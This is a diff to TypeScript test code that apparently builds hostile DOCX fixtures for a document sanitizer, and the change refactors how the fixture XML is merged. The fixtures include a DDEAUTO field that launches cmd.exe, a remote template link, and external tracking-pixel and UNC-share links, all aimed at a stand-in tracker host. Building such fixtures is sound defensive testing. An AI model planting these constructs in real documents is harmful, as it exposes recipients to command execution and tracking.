@@ -27,10 +27,12 @@ function hostileDocx(): Buffer {
     `<Relationship Id="rIdX" Type="${REL("attachedTemplate")}" Target="https://tracker.example/pkg.dotm" TargetMode="External"/></Relationships>`,
   );
   files.set("_rels/.rels", Buffer.from(rels, "utf8"));
+  // 追加到 createDocx 已有的关系里（第 15 批 B-4 起新文档自带样式与页脚关系）
+  const docRels = files.get("word/_rels/document.xml.rels")?.toString("utf8") ?? `<?xml version="1.0" encoding="UTF-8" standalone="yes"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"></Relationships>`;
   files.set(
     "word/_rels/document.xml.rels",
     Buffer.from(
-      `<?xml version="1.0" encoding="UTF-8" standalone="yes"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">` +
+      docRels.replace(/<\/Relationships>\s*$/, "") +
         `<Relationship Id="rIdS" Type="${REL("settings")}" Target="settings.xml"/>` +
         `<Relationship Id="rIdImg" Type="${REL("image")}" Target="http://tracker.example/pixel.png" TargetMode="External"/>` +
         `<Relationship Id="rIdOle" Type="${REL("oleObject")}" Target="file:///\\\\srv\\share\\data.xlsx" TargetMode="External"/>` +
@@ -81,11 +83,8 @@ function hostileDocx(): Buffer {
     // 普通域 PAGE（保留）；DDEAUTO（清空）
     `<w:p>${run(`<w:fldChar w:fldCharType="begin"/>`)}${run(`<w:instrText xml:space="preserve"> PAGE </w:instrText>`)}${run(`<w:fldChar w:fldCharType="separate"/>`)}${run(`<w:t>1</w:t>`)}${run(`<w:fldChar w:fldCharType="end"/>`)}</w:p>` +
     `<w:p>${run(`<w:fldChar w:fldCharType="begin"/>`)}${run(`<w:instrText xml:space="preserve"> DDEAUTO c:\\\\windows\\\\system32\\\\cmd.exe "/c calc" </w:instrText>`)}${run(`<w:fldChar w:fldCharType="end"/>`)}</w:p>`;
-  const doc = files
-    .get("word/document.xml")!
-    .toString("utf8")
-    .replace(`<w:document xmlns:w=`, `<w:document xmlns:r="${R_NS}" xmlns:w=`)
-    .replace("<w:sectPr/>", `${hostile}<w:sectPr/>`);
+  const raw = files.get("word/document.xml")!.toString("utf8");
+  const doc = (raw.includes(`xmlns:r="${R_NS}"`) ? raw : raw.replace(`<w:document xmlns:w=`, `<w:document xmlns:r="${R_NS}" xmlns:w=`)).replace(/<w:sectPr\b/, `${hostile}<w:sectPr`);
   files.set("word/document.xml", Buffer.from(doc, "utf8"));
   return writeRawZip([...files.entries()].map(([name, data]) => ({ name, data })));
 }
@@ -187,11 +186,8 @@ function variantDocx(): Buffer {
     // 嵌套简单域：外层普通、内层外取；外层外取、内层普通
     `<w:p><w:fldSimple w:instr=" QUOTE &quot;外层&quot; "><w:fldSimple w:instr=" INCLUDEPICTURE &quot;http://tracker.example/n1.png&quot; "><w:r><w:t>内层图</w:t></w:r></w:fldSimple></w:fldSimple></w:p>` +
     `<w:p><w:fldSimple w:instr=" INCLUDEPICTURE &quot;http://tracker.example/n2.png&quot; "><w:fldSimple w:instr=" PAGE "><w:r><w:t>页码</w:t></w:r></w:fldSimple></w:fldSimple></w:p>`;
-  const doc = files
-    .get("word/document.xml")!
-    .toString("utf8")
-    .replace(`<w:document xmlns:w=`, `<w:document xmlns:r="${R_NS}" xmlns:w=`)
-    .replace("<w:sectPr/>", `${body}<w:sectPr/>`);
+  const raw = files.get("word/document.xml")!.toString("utf8");
+  const doc = (raw.includes(`xmlns:r="${R_NS}"`) ? raw : raw.replace(`<w:document xmlns:w=`, `<w:document xmlns:r="${R_NS}" xmlns:w=`)).replace(/<w:sectPr\b/, `${body}<w:sectPr`);
   files.set("word/document.xml", Buffer.from(doc, "utf8"));
   return writeRawZip([...files.entries()].map(([name, data]) => ({ name, data })));
 }
